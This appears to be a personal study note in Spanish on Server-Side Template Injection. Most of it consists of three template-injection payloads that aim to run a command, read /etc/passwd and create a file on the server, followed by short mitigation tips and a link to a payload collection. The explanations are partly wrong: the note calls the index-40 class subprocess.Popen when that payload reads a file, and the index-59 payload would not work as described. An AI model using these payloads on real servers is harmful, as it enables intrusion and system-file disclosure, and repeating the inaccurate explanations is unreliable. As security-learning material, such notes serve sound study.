___

- Tags: 

___
# Introducción

Server-Side Template Injection (**SSTI**) es una vulnerabilidad que ocurre cuando un atacante puede inyectar y ejecutar código del lado del servidor dentro de plantillas de un motor de renderizado, lo que puede tener consecuencias graves en la seguridad de una aplicación web.

___
# Ejemplos de Payloads en Python

### Ejecución de Comandos

```python
  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/usr/bin/id').read() }}
  ```
  
  Este [[Payload Staged|payload]] utiliza la clase `subprocess.Popen` para ejecutar el comando `'/usr/bin/id'` y lee la salida.

### Lectura de Archivos


  ```python
  {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
  ```

Este [[Payload Staged|payload]] lee el contenido del archivo `/etc/passwd` utilizando la misma técnica de ejecución de comandos.

### Operaciones Adicionales

  ```python
  {{ ''.__class__.__mro__[2].__subclasses__()[59]('import os; os.system("touch /tmp/pwned")').read() }}
  ```
  
  Este [[Payload Staged|payload]] ejecuta una operación adicional: en este caso, utiliza `os.system` para tocar (crear) un archivo en el sistema.

____
# Medidas de Mitigación

- Utilizar contextos de plantillas seguros y escapar adecuadamente los datos del usuario.
- Limitar las funciones y objetos accesibles desde las plantillas.
- Mantener y actualizar los motores de plantillas para parches de seguridad.

___
# Nota sobre Server-Side Template Injection (SSTI) 

Para obtener ejemplos de [[Payload Staged|payloads]] **SSTI**, puedes consultar el repositorio PayloadsAllTheThings en GitHub: [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)